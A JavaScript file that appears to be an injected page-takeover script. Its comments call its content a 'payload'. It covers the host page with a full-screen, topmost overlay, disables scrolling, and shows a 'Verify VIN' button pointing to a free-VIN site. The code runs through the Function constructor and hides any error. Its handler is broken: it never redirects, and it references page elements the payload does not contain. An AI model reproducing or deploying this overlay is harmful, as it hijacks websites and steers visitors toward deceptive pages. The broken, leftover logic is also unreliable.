// app.js — same single-payload structure as the reference file,
// while retaining the VIN landing-page content and behavior from app.js v2.
(function(){
  'use strict';

  // ── Destination URL ───────────────────────────────────────────────────────
  // Replace this with your actual destination.
  var _u='https://freevin.pages.dev';

  // ── Full landing-page payload ──────────────────────────────────────────────
  var _p=`
<style>
#_vin_lp,#_vin_lp *{box-sizing:border-box}
#_vin_lp{font-family:Arial,Helvetica,sans-serif;background:#f5f8fc;min-height:100vh;width:100%;}
#_vin_lp *{margin:0;padding:0}
.vin-action{min-height:100vh;width:100%;display:flex;align-items:center;justify-content:center;padding:24px}
.vin-btn{width:min(92vw,360px);min-height:58px;border:0;border-radius:12px;padding:15px 24px;background:linear-gradient(135deg,#2563eb,#1749c8);color:#fff;font:800 17px/1 Arial,Helvetica,sans-serif;cursor:pointer;box-shadow:0 10px 28px rgba(37,99,235,.28);transition:transform .15s ease,box-shadow .15s ease}
.vin-btn:hover{transform:translateY(-2px);box-shadow:0 14px 32px rgba(37,99,235,.34)}
.vin-btn:active{transform:translateY(0)}
@media(max-width:480px){.vin-action{padding:16px}.vin-btn{width:100%;max-width:340px;min-height:54px;font-size:16px}}
</style>
<div id="_vin_lp"><main class="vin-action"><button class="vin-btn" id="_cb" type="button">Verify VIN →</button></main></div>`;

  // ── Inline runtime ─────────────────────────────────────────────────────────
  var _code=
    'var _e=document.createElement("div");'+
    '_e.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:auto;";'+
    '_e.innerHTML='+JSON.stringify(_p.replace(/__U__/g,_u))+';'+
    'document.body.appendChild(_e);'+
    'document.body.style.overflow="hidden";'+
    'document.documentElement.style.overflow="hidden";'+
    'var _ldr=document.getElementById("_ldr"),_pf=document.getElementById("_pf");'+
    'if(_pf)setTimeout(function(){_pf.style.width="100%";},50);'+
    'if(_ldr)setTimeout(function(){_ldr.style.opacity="0";setTimeout(function(){_ldr.style.display="none";},500);},1400);'+
    'function _go(){var _u=\"https://freevin.pages.dev\";}'+
    'var _cb=document.getElementById("_cb"),_cta=document.getElementById("_cta"),_vi=document.getElementById("_vin"),_mc=document.getElementById("_mobile_check");'+
    'if(_cb)_cb.addEventListener("click",_go);'+
    'if(_cta)_cta.addEventListener("click",_go);if(_mc)_mc.addEventListener("click",function(){var _i=document.getElementById("_vin");if(_i){_i.focus();window.scrollTo({top:0,behavior:"smooth"});}});'+
    'if(_vi)_vi.addEventListener("keydown",function(e){if(e.key==="Enter")_go();});'+
    'document.querySelectorAll("._blur").forEach(function(el){el.addEventListener("click",_go);});'+
    'var _fd=document.getElementById("_fd");'+
    'if(_fd){var _d=new Date();_d.setDate(_d.getDate()+1);var _mo=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];_fd.textContent=_mo[_d.getMonth()]+" "+_d.getDate()+", "+_d.getFullYear();}';

  setTimeout(function(){
    try{
      var _F=Function;
      _F(_code)();
    }catch(e){}
  },80);

})();
